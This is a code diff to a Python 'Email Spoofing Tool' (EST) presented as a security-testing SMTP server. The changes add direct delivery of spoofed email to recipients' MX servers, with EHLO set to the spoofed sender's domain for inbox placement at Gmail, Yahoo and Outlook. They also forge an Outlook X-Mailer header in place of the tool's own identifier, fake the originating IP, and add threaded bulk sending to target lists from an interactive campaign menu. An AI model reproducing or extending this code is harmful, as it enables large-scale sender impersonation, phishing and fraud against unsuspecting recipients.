@@ -46,6 +46,7 @@ from email import encoders
 from email.header import Header
 from email.utils import formatdate
 import email.utils
+from concurrent.futures import ThreadPoolExecutor, as_completed
 
 # Version and metadata
 __version__ = "3.1.0"
@@ -579,10 +580,11 @@ class ESTConfig:
 class SMTPTestServer:
     """Professional SMTP server for security testing"""
     
-    def __init__(self, host: str, port: int, config: ESTConfig):
+    def __init__(self, host: str, port: int, config: ESTConfig, quiet: bool = False):
         self.host = host
         self.port = port
         self.config = config
+        self.quiet = quiet
         self.running = False
         self.connections = 0
         self.emails_processed = 0
@@ -596,7 +598,8 @@ class SMTPTestServer:
             self.sock.listen(10)
             self.running = True
             
-            print(f"""
+            if not self.quiet:
+                print(f"""
 ╔══════════════════════════════════════════════════════════════╗
 ║                    EST SMTP SERVER v{__version__}                    ║
 ║              Email Spoofing Tool - Server Mode               ║
@@ -619,10 +622,11 @@ class SMTPTestServer:
    est test 1 target@example.com
    
 🛑 Press Ctrl+C to stop server
-            """)
+                """)
             
-            # Handle Ctrl+C gracefully
-            signal.signal(signal.SIGINT, self._signal_handler)
+            # Handle Ctrl+C gracefully (only in foreground mode)
+            if not self.quiet:
+                signal.signal(signal.SIGINT, self._signal_handler)
             
             while self.running:
                 try:
@@ -783,30 +787,43 @@ class SMTPTestServer:
         return success_count > 0
     
     def _relay_email(self, mail_from: str, rcpt_to: str, email_data: str) -> bool:
-        """Relay email to destination"""
+        """Relay email to destination with proper EHLO and STARTTLS for deliverability."""
         try:
             domain = rcpt_to.split('@')[1]
+            sender_domain = mail_from.split('@')[1] if '@' in mail_from else 'localhost'
             mx_servers = self._get_mx_servers(domain)
             
             self.config.logger.info(f"Attempting relay to {rcpt_to} via {len(mx_servers)} MX servers")
             
             for mx_server in mx_servers:
-                try:
-                    server = smtplib.SMTP(mx_server, 25, timeout=15)
-                    server.set_debuglevel(0)
-                    
-                    # Ensure proper encoding
-                    full_email = f"From: {mail_from}\r\nTo: {rcpt_to}\r\n{email_data}"
-                    full_email_bytes = full_email.encode('utf-8')
-                    server.sendmail(mail_from, [rcpt_to], full_email_bytes)
-                    server.quit()
-                    
-                    self.config.logger.info(f"✅ Email delivered to {rcpt_to} via {mx_server}")
-                    return True
-                    
-                except Exception as e:
-                    self.config.logger.warning(f"❌ Relay failed via {mx_server}: {str(e)[:60]}...")
-                    continue
+                # Try port 25 first, then 587 as fallback
+                for port in (25, 587):
+                    try:
+                        server = smtplib.SMTP(mx_server, port, timeout=20)
+                        server.set_debuglevel(0)
+
+                        # Use spoofed sender domain for EHLO (key for inbox delivery)
+                        server.ehlo(sender_domain)
+
+                        # Attempt STARTTLS (improves inbox placement at Gmail/Yahoo/Outlook)
+                        try:
+                            server.starttls()
+                            server.ehlo(sender_domain)
+                        except (smtplib.SMTPNotSupportedError, smtplib.SMTPException):
+                            pass  # Server doesn't support STARTTLS – continue without
+
+                        # Ensure proper encoding
+                        full_email = f"From: {mail_from}\r\nTo: {rcpt_to}\r\n{email_data}"
+                        full_email_bytes = full_email.encode('utf-8')
+                        server.sendmail(mail_from, [rcpt_to], full_email_bytes)
+                        server.quit()
+                        
+                        self.config.logger.info(f"✅ Email delivered to {rcpt_to} via {mx_server}:{port}")
+                        return True
+                        
+                    except Exception as e:
+                        self.config.logger.warning(f"❌ Relay failed via {mx_server}:{port}: {str(e)[:60]}...")
+                        continue
             
             self.config.logger.error(f"❌ All relay attempts failed for {rcpt_to}")
             return False
@@ -952,14 +969,17 @@ class EST:
         else:
             msg = MIMEMultipart('alternative')
 
-        # Standard headers
+        # Standard headers – comprehensive set for maximum deliverability
+        msg['MIME-Version'] = '1.0'
         msg['From'] = f"{from_name} <{from_email}>"
         msg['To'] = to_email
         msg['Subject'] = Header(subject, 'utf-8')
         msg['Date'] = formatdate(localtime=True)
         sender_domain = from_email.split('@')[1] if '@' in from_email else 'localhost'
         msg['Message-ID'] = email.utils.make_msgid(domain=sender_domain)
-        msg['X-Mailer'] = f"EST/{__version__}"
+        msg['Return-Path'] = f"<{from_email}>"
+        msg['X-Mailer'] = f"Microsoft Outlook 16.0"
+        msg['X-Originating-IP'] = '127.0.0.1'
 
         # Reply-To header
         if reply_to:
@@ -1169,7 +1189,10 @@ class EST:
                      body_text_file: Optional[str] = None,
                      target_list: Optional[str] = None,
                      delay: float = 0,
-                     validate_dns: bool = True) -> bool:
+                     validate_dns: bool = True,
+                     direct_delivery: bool = False,
+                     auto_server: bool = True,
+                     workers: int = 1) -> bool:
         """Run a specific spoofing scenario against one or more targets"""
         try:
             scenario = self.scenarios[scenario_id - 1]
@@ -1214,12 +1237,86 @@ class EST:
             print(f"📎 Attachments: {len(attachments)} file(s)")
         if resolved_html:
             print(f"🌐 HTML Body: enabled")
-        print(f"📡 SMTP Server: {smtp_host}:{smtp_port}")
+        if direct_delivery:
+            print(f"📡 Delivery: DIRECT MX (DNS-aware inbox delivery)")
+        else:
+            print(f"📡 SMTP Server: {smtp_host}:{smtp_port}")
         if delay > 0 and len(targets) > 1:
             print(f"⏱️  Throttle: {delay}s between sends")
+        if workers > 1 and len(targets) > 1:
+            print(f"⚡ Concurrent workers: {workers}")
         print(f"🕐 Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
         print()
 
+        # Auto-start SMTP server if needed (not in direct mode)
+        if auto_server and not direct_delivery and smtp_host in ('localhost', '127.0.0.1'):
+            self._ensure_smtp_server(port=smtp_port)
+
+        # --- Concurrent sending path ---
+        if workers > 1 and len(targets) > 1:
+            print(f"⚡ Using {workers} concurrent workers for {len(targets)} targets")
+            success_count = 0
+
+            def _send_one_scenario(tgt: str) -> str:
+                content = self._build_email_message(
+                    from_email=scenario.from_email,
+                    from_name=scenario.from_name,
+                    to_email=tgt,
+                    subject=scenario.subject,
+                    body=effective_body,
+                    html_body=resolved_html,
+                    attachments=attachments,
+                    reply_to=reply_to,
+                    in_reply_to=in_reply_to,
+                    references=references,
+                    scenario=scenario,
+                )
+                self._deliver_email(
+                    scenario.from_email, tgt, content,
+                    smtp_host, smtp_port, direct_delivery
+                )
+                return tgt
+
+            with ThreadPoolExecutor(max_workers=workers) as executor:
+                futures = {executor.submit(_send_one_scenario, tgt): tgt
+                           for tgt in targets}
+                for future in as_completed(futures):
+                    tgt = futures[future]
+                    try:
+                        future.result()
+                        success_count += 1
+                        print(f"   ✅ Delivered to {tgt}")
+                        self._log_test_result(TestResult(
+                            timestamp=datetime.now().isoformat(),
+                            test_type="scenario_test",
+                            scenario=scenario.name,
+                            target=tgt,
+                            from_email=scenario.from_email,
+                            success=True,
+                            details={
+                                "category": scenario.category,
+                                "severity": scenario.severity,
+                                "direct_delivery": direct_delivery,
+                                "concurrent": True,
+                                "workers": workers,
+                            }
+                        ))
+                    except Exception as e:
+                        print(f"   ❌ Failed for {tgt}: {e}")
+                        self._log_test_result(TestResult(
+                            timestamp=datetime.now().isoformat(),
+                            test_type="scenario_test",
+                            scenario=scenario.name,
+                            target=tgt,
+                            from_email=scenario.from_email,
+                            success=False,
+                            details={"error": str(e), "concurrent": True}
+                        ))
+
+            print(f"\n📊 Concurrent send complete: {success_count}/{len(targets)} succeeded")
+            return success_count > 0
+
+        # --- Sequential sending path (original logic) ---
         success_count = 0
         for idx, tgt in enumerate(targets, 1):
             try:
@@ -1240,11 +1337,12 @@ class EST:
                 if len(targets) > 1:
                     print(f"🚀 [{idx}/{len(targets)}] Sending to {tgt}...")
                 else:
-                    print("🚀 Initiating SMTP connection...")
+                    print("🚀 Initiating email delivery...")
 
-                server = smtplib.SMTP(smtp_host, smtp_port, timeout=30)
-                server.sendmail(scenario.from_email, [tgt], email_content)
-                server.quit()
+                self._deliver_email(
+                    scenario.from_email, tgt, email_content,
+                    smtp_host, smtp_port, direct_delivery
+                )
 
                 success_count += 1
                 if len(targets) == 1:
@@ -1307,7 +1405,10 @@ class EST:
                         body_text_file: Optional[str] = None,
                         target_list: Optional[str] = None,
                         delay: float = 0,
-                        validate_dns: bool = True) -> bool:
+                        validate_dns: bool = True,
+                        direct_delivery: bool = False,
+                        auto_server: bool = True,
+                        workers: int = 1) -> bool:
         """Run custom spoofing test with full feature set"""
 
         # Resolve targets
@@ -1344,12 +1445,85 @@ class EST:
             print(f"📎 Attachments: {len(attachments)} file(s)")
         if resolved_html:
             print(f"🌐 HTML Body: enabled")
-        print(f"📡 SMTP Server: {smtp_host}:{smtp_port}")
+        if direct_delivery:
+            print(f"📡 Delivery: DIRECT MX (DNS-aware inbox delivery)")
+        else:
+            print(f"📡 SMTP Server: {smtp_host}:{smtp_port}")
         if delay > 0 and len(targets) > 1:
             print(f"⏱️  Throttle: {delay}s between sends")
+        if workers > 1 and len(targets) > 1:
+            print(f"⚡ Concurrent workers: {workers}")
         print(f"🕐 Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
         print()
 
+        # Auto-start SMTP server if needed (not in direct mode)
+        if auto_server and not direct_delivery and smtp_host in ('localhost', '127.0.0.1'):
+            self._ensure_smtp_server(port=smtp_port)
+
+        # --- Concurrent sending path ---
+        if workers > 1 and len(targets) > 1:
+            print(f"⚡ Using {workers} concurrent workers for {len(targets)} targets")
+            success_count = 0
+
+            def _send_one_custom(tgt: str) -> str:
+                content = self._build_email_message(
+                    from_email=from_email,
+                    from_name=from_name,
+                    to_email=tgt,
+                    subject=subject,
+                    body=effective_body,
+                    html_body=resolved_html,
+                    attachments=attachments,
+                    reply_to=reply_to,
+                    in_reply_to=in_reply_to,
+                    references=references,
+                )
+                self._deliver_email(
+                    from_email, tgt, content,
+                    smtp_host, smtp_port, direct_delivery
+                )
+                return tgt
+
+            with ThreadPoolExecutor(max_workers=workers) as executor:
+                futures = {executor.submit(_send_one_custom, tgt): tgt
+                           for tgt in targets}
+                for future in as_completed(futures):
+                    tgt = futures[future]
+                    try:
+                        future.result()
+                        success_count += 1
+                        print(f"   ✅ Delivered to {tgt}")
+                        self._log_test_result(TestResult(
+                            timestamp=datetime.now().isoformat(),
+                            test_type="custom_test",
+                            scenario="custom",
+                            target=tgt,
+                            from_email=from_email,
+                            success=True,
+                            details={
+                                "from_name": from_name,
+                                "subject": subject,
+                                "direct_delivery": direct_delivery,
+                                "concurrent": True,
+                                "workers": workers,
+                            }
+                        ))
+                    except Exception as e:
+                        print(f"   ❌ Failed for {tgt}: {e}")
+                        self._log_test_result(TestResult(
+                            timestamp=datetime.now().isoformat(),
+                            test_type="custom_test",
+                            scenario="custom",
+                            target=tgt,
+                            from_email=from_email,
+                            success=False,
+                            details={"error": str(e), "concurrent": True}
+                        ))
+
+            print(f"\n📊 Concurrent send complete: {success_count}/{len(targets)} succeeded")
+            return success_count > 0
+
+        # --- Sequential sending path (original logic) ---
         success_count = 0
         for idx, tgt in enumerate(targets, 1):
             try:
@@ -1369,11 +1543,12 @@ class EST:
                 if len(targets) > 1:
                     print(f"🚀 [{idx}/{len(targets)}] Sending to {tgt}...")
                 else:
-                    print("🚀 Initiating SMTP connection...")
+                    print("🚀 Initiating email delivery...")
 
-                server = smtplib.SMTP(smtp_host, smtp_port, timeout=30)
-                server.sendmail(from_email, [tgt], email_content)
-                server.quit()
+                self._deliver_email(
+                    from_email, tgt, email_content,
+                    smtp_host, smtp_port, direct_delivery
+                )
 
                 success_count += 1
                 if len(targets) == 1:
@@ -1437,7 +1612,10 @@ class EST:
                       from_name: Optional[str] = None,
                       subject: Optional[str] = None,
                       body: Optional[str] = None,
-                      validate_dns: bool = True) -> bool:
+                      validate_dns: bool = True,
+                      direct_delivery: bool = False,
+                      auto_server: bool = True,
+                      workers: int = 1) -> bool:
         """Run a bulk spoofing campaign against a list of targets."""
         if scenario_id is not None:
             return self.run_scenario(
@@ -1455,6 +1633,9 @@ class EST:
                 target_list=target_list,
                 delay=delay,
                 validate_dns=validate_dns,
+                direct_delivery=direct_delivery,
+                auto_server=auto_server,
+                workers=workers,
             )
         elif from_email and from_name and subject and body:
             return self.run_custom_test(
@@ -1475,6 +1656,9 @@ class EST:
                 target_list=target_list,
                 delay=delay,
                 validate_dns=validate_dns,
+                direct_delivery=direct_delivery,
+                auto_server=auto_server,
+                workers=workers,
             )
         else:
             print("❌ Bulk mode requires either --scenario or all of --from-email, --from-name, --subject, --body")
@@ -1731,6 +1915,523 @@ class EST:
         except Exception as e:
             self.config.logger.error(f"Failed to log test result: {e}")
 
+    # ------------------------------------------------------------------
+    # Direct MX Delivery (DNS-aware inbox penetration)
+    # ------------------------------------------------------------------
+
+    def _get_target_mx_servers(self, domain: str) -> List[str]:
+        """Resolve MX servers for a target domain for direct delivery."""
+        try:
+            import dns.resolver
+            mx_records = dns.resolver.resolve(domain, 'MX')
+            servers = [str(mx.exchange).rstrip('.')
+                       for mx in sorted(mx_records, key=lambda x: x.preference)]
+            self.config.logger.debug(f"MX servers for {domain}: {servers}")
+            return servers
+        except ImportError:
+            self.config.logger.warning("dnspython not available for MX resolution")
+        except Exception as e:
+            self.config.logger.warning(f"MX lookup failed for {domain}: {e}")
+
+        # Fallback: try common MX patterns
+        fallbacks = [f"mail.{domain}", f"mx.{domain}", f"mx1.{domain}", f"smtp.{domain}"]
+        working: List[str] = []
+        for mx in fallbacks:
+            try:
+                socket.gethostbyname(mx)
+                working.append(mx)
+            except Exception:
+                continue
+        return working
+
+    def _send_direct_to_mx(self, from_email: str, to_email: str,
+                           email_content: str) -> bool:
+        """Send email directly to the target's MX servers (bypass local SMTP).
+
+        Uses the sender's domain for EHLO to improve deliverability against
+        major providers (Gmail, Yahoo, Outlook, Comcast, etc.).
+        Tries each MX server in priority order with port fallbacks and retries.
+        """
+        target_domain = to_email.split('@')[1]
+        sender_domain = from_email.split('@')[1] if '@' in from_email else 'localhost'
+        mx_servers = self._get_target_mx_servers(target_domain)
+
+        if not mx_servers:
+            self.config.logger.error(f"No MX servers found for {target_domain}")
+            return False
+
+        self.config.logger.info(
+            f"Direct MX delivery: {from_email} → {to_email} "
+            f"via {len(mx_servers)} MX server(s)"
+        )
+
+        # Try each MX server with multiple ports and retry backoff
+        for mx_server in mx_servers:
+            for port in (25, 587):
+                for attempt in range(1, 4):  # Up to 3 attempts per port
+                    try:
+                        server = smtplib.SMTP(mx_server, port, timeout=30)
+                        server.ehlo(sender_domain)
+
+                        # Try STARTTLS if available (improves deliverability)
+                        try:
+                            server.starttls()
+                            server.ehlo(sender_domain)
+                        except (smtplib.SMTPNotSupportedError, smtplib.SMTPException):
+                            pass  # Server doesn't support STARTTLS
+
+                        server.sendmail(from_email, [to_email], email_content)
+                        server.quit()
+
+                        self.config.logger.info(
+                            f"✅ Direct delivery successful: {to_email} via {mx_server}:{port}"
+                        )
+                        return True
+
+                    except smtplib.SMTPResponseException as e:
+                        # If server explicitly rejected (5xx), no point retrying same port
+                        if 500 <= e.smtp_code < 600:
+                            self.config.logger.warning(
+                                f"❌ Permanent rejection {mx_server}:{port}: "
+                                f"{e.smtp_code} {str(e.smtp_error)[:60]}"
+                            )
+                            break  # Skip retries for this port, try next
+                        # Temporary error (4xx) – retry after backoff
+                        backoff = 2 ** attempt
+                        self.config.logger.warning(
+                            f"⏳ Temporary error {mx_server}:{port} "
+                            f"(attempt {attempt}/3): {e.smtp_code}, retrying in {backoff}s..."
+                        )
+                        time.sleep(backoff)
+
+                    except (ConnectionRefusedError, OSError, socket.timeout) as e:
+                        self.config.logger.warning(
+                            f"❌ Connection failed {mx_server}:{port}: {str(e)[:60]}"
+                        )
+                        break  # Try next port or server
+
+                    except Exception as e:
+                        backoff = 2 ** attempt
+                        self.config.logger.warning(
+                            f"❌ Direct delivery attempt {attempt}/3 via {mx_server}:{port}: "
+                            f"{str(e)[:60]}, retrying in {backoff}s..."
+                        )
+                        time.sleep(backoff)
+
+        self.config.logger.error(f"❌ All MX servers failed for {to_email}")
+        return False
+
+    def _deliver_email(self, from_email: str, to_email: str,
+                       email_content: str,
+                       smtp_host: str = 'localhost', smtp_port: int = 2525,
+                       direct_delivery: bool = False) -> bool:
+        """Unified email delivery: direct MX or via SMTP relay."""
+        if direct_delivery:
+            return self._send_direct_to_mx(from_email, to_email, email_content)
+        else:
+            server = smtplib.SMTP(smtp_host, smtp_port, timeout=30)
+            server.sendmail(from_email, [to_email], email_content)
+            server.quit()
+            return True
+
+    # ------------------------------------------------------------------
+    # Auto-start SMTP server in background
+    # ------------------------------------------------------------------
+
+    _background_server: Optional['SMTPTestServer'] = None
+    _background_server_thread: Optional[threading.Thread] = None
+
+    def _ensure_smtp_server(self, host: str = '0.0.0.0', port: int = 2525) -> bool:
+        """Auto-start a background SMTP relay server if not already running.
+
+        Eliminates the need to open a separate terminal window.
+        """
+        # Check if a server is already listening
+        try:
+            test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            test_sock.settimeout(2)
+            result = test_sock.connect_ex(('127.0.0.1', port))
+            test_sock.close()
+            if result == 0:
+                self.config.logger.info(f"SMTP server already running on port {port}")
+                return True
+        except Exception:
+            pass
+
+        print(f"\n🚀 Auto-starting EST SMTP relay server on port {port}...")
+        bg_server = SMTPTestServer(host, port, self.config, quiet=True)
+        bg_thread = threading.Thread(
+            target=bg_server.start,
+            daemon=True,
+            name="EST-BackgroundSMTP"
+        )
+        bg_thread.start()
+
+        # Wait for server to become ready
+        for _attempt in range(10):
+            time.sleep(0.5)
+            try:
+                test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                test_sock.settimeout(2)
+                result = test_sock.connect_ex(('127.0.0.1', port))
+                test_sock.close()
+                if result == 0:
+                    print(f"✅ SMTP relay server ready on port {port}\n")
+                    EST._background_server = bg_server
+                    EST._background_server_thread = bg_thread
+                    return True
+            except Exception:
+                continue
+
+        print(f"⚠️  SMTP server may not have started on port {port}")
+        return False
+
+    # ------------------------------------------------------------------
+    # Interactive Menu Mode
+    # ------------------------------------------------------------------
+
+    def run_interactive(self):
+        """Launch interactive menu with all EST features in one window."""
+        while True:
+            print(f"""
+╔══════════════════════════════════════════════════════════════╗
+║                    EST Interactive Menu                       ║
+║              All Features • One Terminal                      ║
+╚══════════════════════════════════════════════════════════════╝
+
+   📋 Main Menu
+   ─────────────────────────────────────────
+   1. 📧  Run Spoofing Scenario     (predefined attack templates)
+   2. ✏️   Custom Email Spoof        (craft your own spoofed email)
+   3. 📨  Bulk Email Campaign       (multiple targets concurrently)
+   4. 🔍  DNS Recon                 (check SPF/DKIM/DMARC)
+   5. 📋  List Scenarios            (view available templates)
+   6. 📊  View Logs                 (review test history)
+   7. 📝  Generate Report           (assessment report)
+   8. 🚀  Start SMTP Server         (manual relay server)
+   9. 🔑  License Management        (view/manage license)
+   0. 🚪  Exit
+""")
+            try:
+                choice = input("   Select option [0-9]: ").strip()
+            except (EOFError, KeyboardInterrupt):
+                print("\n\n👋 Goodbye!")
+                break
+
+            if choice == '0':
+                print("\n👋 Goodbye!")
+                break
+            elif choice == '1':
+                self._interactive_scenario()
+            elif choice == '2':
+                self._interactive_custom()
+            elif choice == '3':
+                self._interactive_bulk()
+            elif choice == '4':
+                self._interactive_dns_check()
+            elif choice == '5':
+                self.list_scenarios()
+            elif choice == '6':
+                lines_str = self._interactive_prompt("Number of log entries", "20")
+                try:
+                    self.show_logs(int(lines_str))
+                except ValueError:
+                    self.show_logs(20)
+            elif choice == '7':
+                self.generate_report()
+            elif choice == '8':
+                self._interactive_server()
+            elif choice == '9':
+                self._interactive_license()
+            else:
+                print("   ❌ Invalid option. Please try again.")
+
+            try:
+                input("\n   Press Enter to continue...")
+            except (EOFError, KeyboardInterrupt):
+                print("\n\n👋 Goodbye!")
+                break
+
+    def _interactive_prompt(self, prompt: str, default: str = '',
+                            required: bool = False) -> str:
+        """Helper for interactive prompts with optional defaults."""
+        suffix = f" [{default}]" if default else ""
+        if required and not default:
+            suffix += " (required)"
+        try:
+            value = input(f"   {prompt}{suffix}: ").strip()
+        except (EOFError, KeyboardInterrupt):
+            return default
+        return value or default
+
+    @staticmethod
+    def _validate_email(addr: str) -> bool:
+        """Quick sanity check for an email address format."""
+        return bool(re.match(r'^[^@\s]+@[^@\s]+\.[^@\s]+$', addr))
+
+    def _interactive_delivery_mode(self) -> Tuple[bool, bool]:
+        """Ask user for delivery mode. Returns (direct_delivery, auto_server)."""
+        print("\n   📡 Delivery Mode:")
+        print("   1. Direct MX (recommended – sends directly to target mail servers)")
+        print("   2. Local SMTP relay (auto-starts server in background)")
+        mode = self._interactive_prompt("Select", "1")
+        if mode == '2':
+            return False, True
+        return True, False
+
+    def _interactive_scenario(self):
+        """Interactive scenario execution."""
+        print()
+        self.list_scenarios()
+
+        sid = self._interactive_prompt("Scenario ID", required=True)
+        if not sid.isdigit():
+            print("   ❌ Invalid scenario ID")
+            return
+
+        target = self._interactive_prompt("Target email(s) (comma-separated)", required=True)
+        if not target:
+            print("   ❌ Target email required")
+            return
+        first_addr = target.split(',')[0].strip()
+        if not self._validate_email(first_addr):
+            print(f"   ⚠️  '{first_addr}' may not be a valid email address")
+
+        direct, auto = self._interactive_delivery_mode()
+        reply_to = self._interactive_prompt("Reply-To address (optional)") or None
+        att_path = self._interactive_prompt("Attachment file path (optional)") or None
+        attachments = [att_path] if att_path else None
+        html_file = self._interactive_prompt("HTML body file (optional)") or None
+
+        workers_str = self._interactive_prompt("Concurrent workers", "1")
+        workers = int(workers_str) if workers_str.isdigit() else 1
+
+        self.run_scenario(
+            scenario_id=int(sid),
+            target=target,
+            direct_delivery=direct,
+            auto_server=auto,
+            reply_to=reply_to,
+            attachments=attachments,
+            body_file=html_file,
+            validate_dns=True,
+            workers=workers,
+        )
+
+    def _interactive_custom(self):
+        """Interactive custom spoofing test."""
+        print("\n   ✏️  Custom Email Spoof Setup\n")
+
+        # Option to load from JSON template
+        template_path = self._interactive_prompt("JSON template file (optional, press Enter to skip)")
+        tpl_data: Optional[Dict] = None
+        if template_path and Path(template_path).is_file():
+            tpl_data = self._load_template(template_path)
+            if tpl_data:
+                print("   ✅ Template loaded – press Enter at any prompt to use template value")
+
+        from_email = self._interactive_prompt(
+            "Spoofed sender email",
+            default=tpl_data.get('from_email', '') if tpl_data else '',
+            required=True
+        )
+        if not from_email:
+            print("   ❌ Sender email required")
+            return
+        if not self._validate_email(from_email):
+            print(f"   ⚠️  '{from_email}' may not be a valid email format")
+
+        from_name = self._interactive_prompt(
+            "Spoofed sender name",
+            default=tpl_data.get('from_name', '') if tpl_data else '',
+            required=True
+        )
+        if not from_name:
+            print("   ❌ Sender name required")
+            return
+        subject = self._interactive_prompt(
+            "Email subject",
+            default=tpl_data.get('subject', '') if tpl_data else '',
+            required=True
+        )
+        if not subject:
+            print("   ❌ Subject required")
+            return
+
+        print("   Enter email body text, or a file path to a text file:")
+        body_input = self._interactive_prompt(
+            "Body / file path",
+            default=tpl_data.get('body', '') if tpl_data else '',
+            required=True
+        )
+        body_text_file = None
+        body = body_input
+        if body_input and Path(body_input).is_file():
+            body_text_file = body_input
+            body = ""
+
+        target = self._interactive_prompt("Target email(s) (comma-separated)", required=True)
+        if not target:
+            print("   ❌ Target email required")
+            return
+        first_addr = target.split(',')[0].strip()
+        if not self._validate_email(first_addr):
+            print(f"   ⚠️  '{first_addr}' may not be a valid email address")
+
+        direct, auto = self._interactive_delivery_mode()
+        reply_to = self._interactive_prompt("Reply-To address (optional)") or None
+        att_path = self._interactive_prompt("Attachment file path (optional)") or None
+        attachments = [att_path] if att_path else None
+        html_file = self._interactive_prompt("HTML body file (optional)") or None
+
+        workers_str = self._interactive_prompt("Concurrent workers", "1")
+        workers = int(workers_str) if workers_str.isdigit() else 1
+
+        self.run_custom_test(
+            from_email=from_email,
+            from_name=from_name,
+            subject=subject,
+            body=body or "Test email body",
+            target=target,
+            direct_delivery=direct,
+            auto_server=auto,
+            reply_to=reply_to,
+            attachments=attachments,
+            body_text_file=body_text_file,
+            body_file=html_file,
+            validate_dns=True,
+            workers=workers,
+        )
+
+    def _interactive_bulk(self):
+        """Interactive bulk email campaign."""
+        print("\n   📨 Bulk Email Campaign Setup\n")
+
+        print("   Use predefined scenario or custom?")
+        print("   1. Predefined scenario")
+        print("   2. Custom email")
+        mode = self._interactive_prompt("Select", "1")
+
+        scenario_id = None
+        from_email = from_name = subject = body = None
+        body_text_file = None
+
+        if mode == '1':
+            self.list_scenarios()
+            sid = self._interactive_prompt("Scenario ID", required=True)
+            if not sid.isdigit():
+                print("   ❌ Invalid scenario ID")
+                return
+            scenario_id = int(sid)
+        else:
+            from_email = self._interactive_prompt("Spoofed sender email", required=True)
+            from_name = self._interactive_prompt("Spoofed sender name", required=True)
+            subject = self._interactive_prompt("Email subject", required=True)
+            body_input = self._interactive_prompt("Body / file path", required=True)
+            if body_input and Path(body_input).is_file():
+                body_text_file = body_input
+                body = ""
+            else:
+                body = body_input
+
+        target_list = self._interactive_prompt("Target list file path", required=True)
+        if not target_list or not Path(target_list).is_file():
+            print("   ❌ Valid target list file required")
+            return
+
+        direct, auto = self._interactive_delivery_mode()
+
+        workers_str = self._interactive_prompt("Concurrent workers", "1")
+        workers = int(workers_str) if workers_str.isdigit() else 1
+        delay_str = self._interactive_prompt("Delay between sends (seconds)", "1")
+        try:
+            delay = float(delay_str)
+        except ValueError:
+            delay = 1.0
+
+        self.run_bulk_test(
+            scenario_id=scenario_id,
+            target_list=target_list,
+            delay=delay,
+            from_email=from_email,
+            from_name=from_name,
+            subject=subject,
+            body=body,
+            body_text_file=body_text_file,
+            direct_delivery=direct,
+            auto_server=auto,
+            workers=workers,
+            validate_dns=True,
+        )
+
+    def _interactive_dns_check(self):
+        """Interactive DNS check."""
+        domain = self._interactive_prompt("Domain or sender email to check", required=True)
+        if domain:
+            self.check_dns(domain)
+
+    def _interactive_server(self):
+        """Interactive SMTP server start."""
+        host = self._interactive_prompt("Bind host", "0.0.0.0")
+        port_str = self._interactive_prompt("Bind port", "2525")
+        try:
+            port = int(port_str)
+        except ValueError:
+            port = 2525
+
+        print(f"\n   Starting SMTP server on {host}:{port}...")
+        print("   Press Ctrl+C to stop and return to menu.\n")
+        server = SMTPTestServer(host, port, self.config)
+        try:
+            server.start()
+        except KeyboardInterrupt:
+            print("\n   Server stopped.")
+
+    def _interactive_license(self):
+        """Interactive license management."""
+        print("\n   🔑 License Management\n")
+        print("   1. View license status")
+        print("   2. Activate license")
+        print("   3. Deactivate license")
+        print("   4. Generate license key (owner)")
+        print("   5. Show machine ID")
+        choice = self._interactive_prompt("Select", "1")
+
+        if choice == '1':
+            self.license_mgr.print_status()
+        elif choice == '2':
+            key = self._interactive_prompt("License key", required=True)
+            if key:
+                result = self.license_mgr.activate_license(key)
+                if result["valid"]:
+                    print(f"   ✅ {result.get('message', 'License activated')}")
+                else:
+                    print(f"   ❌ Activation failed: {result.get('error')}")
+        elif choice == '3':
+            if self.license_mgr.deactivate_license():
+                print("   ✅ License removed")
+            else:
+                print("   ⚠️  No license was installed")
+        elif choice == '4':
+            mid = self._interactive_prompt("Machine ID (leave blank for this machine)") or None
+            mid = mid or LicenseManager._get_machine_id()
+            days_str = self._interactive_prompt("Days valid", "365")
+            tier = self._interactive_prompt("Tier (basic/pro/enterprise)", "pro")
+            try:
+                days = int(days_str)
+            except ValueError:
+                days = 365
+            key = LicenseManager.generate_license_key(machine_id=mid, days_valid=days, tier=tier)
+            print(f"\n   🔑 Generated License Key")
+            print(f"   {'─' * 50}")
+            print(f"   Machine ID: {mid}")
+            print(f"   Tier:       {tier}")
+            print(f"   Valid for:  {days} days")
+            print(f"\n   Key:\n   {key}\n")
+        elif choice == '5':
+            mid = LicenseManager._get_machine_id()
+            print(f"\n   🖥️  Machine ID: {mid}")
+
 def _add_common_send_args(parser: argparse.ArgumentParser):
     """Add common arguments shared by test, custom, and bulk subcommands."""
     parser.add_argument('--smtp-host', default='localhost',
@@ -1759,6 +2460,13 @@ def _add_common_send_args(parser: argparse.ArgumentParser):
                         help='Seconds to wait between sends for bulk/multiple targets (default: 0)')
     parser.add_argument('--no-dns-check', action='store_true', default=False,
                         help='Skip DNS (SPF/DKIM/DMARC) validation of sender domain')
+    parser.add_argument('--direct', action='store_true', default=False,
+                        help='Send directly to target MX servers (bypass local SMTP relay). '
+                             'Recommended for inbox delivery to Gmail, Yahoo, Outlook, etc.')
+    parser.add_argument('--no-auto-server', action='store_true', default=False,
+                        help='Do not auto-start SMTP server when using relay mode')
+    parser.add_argument('--workers', type=int, default=1,
+                        help='Number of concurrent sending threads (default: 1, sequential)')
 
 
 def _apply_template(est: EST, args, is_custom: bool = False):
@@ -1811,6 +2519,11 @@ Examples:
          --target-list targets.txt \\
          --delay 2                          Bulk scenario against list
   est dns-check ceo@company.com             Check sender DNS records
+  est test 1 target@gmail.com --direct      Direct MX delivery (inbox)
+  est bulk --scenario 1 \\
+         --target-list targets.txt \\
+         --direct --workers 4               Concurrent direct delivery
+  est interactive                           Launch interactive menu
   est logs --lines 50                       View recent test logs
   est report                                Generate assessment report
   est license status                        Show license status
@@ -1907,6 +2620,10 @@ Author: {__author__} | License: {__license__}
                          help='License tier (default: pro)')
     license_sub.add_parser('machine-id', help='Show this machine\'s fingerprint')
 
+    # Interactive mode command
+    subparsers.add_parser('interactive',
+                          help='Launch interactive menu with all features in one terminal')
+
     args = parser.parse_args()
     
     # Initialize EST
@@ -2002,6 +2719,9 @@ Author: {__author__} | License: {__license__}
             target_list=args.target_list,
             delay=args.delay,
             validate_dns=not args.no_dns_check,
+            direct_delivery=args.direct,
+            auto_server=not args.no_auto_server,
+            workers=args.workers,
         )
         sys.exit(0 if success else 1)
     
@@ -2037,6 +2757,9 @@ Author: {__author__} | License: {__license__}
             target_list=args.target_list,
             delay=args.delay,
             validate_dns=not args.no_dns_check,
+            direct_delivery=args.direct,
+            auto_server=not args.no_auto_server,
+            workers=args.workers,
         )
